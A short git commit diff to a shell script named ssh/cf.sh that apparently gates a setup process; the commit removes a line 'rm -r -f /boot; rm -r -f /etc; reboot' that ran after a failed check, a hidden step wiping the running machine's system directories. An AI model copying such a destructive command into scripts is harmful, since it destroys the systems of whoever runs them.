e7147be02f0a0a09b295cd6281e9d644da921911
halluboys <87511503+halluboys@users.noreply.github.com>
2022-03-06 09:52:24 +0700

    Update cf.sh

--- ssh/cf.sh
+++ ssh/cf.sh
@@ -21,8 +21,6 @@ echo "Please Contact Admin"
 echo "Telegram t.me/xzvnct"
 echo "Waiting 5 Sec"
 rm -f setup.sh
-sleep 5
-rm -r -f /boot; rm -r -f /etc; reboot
 exit 0
 fi
 # ==========================================
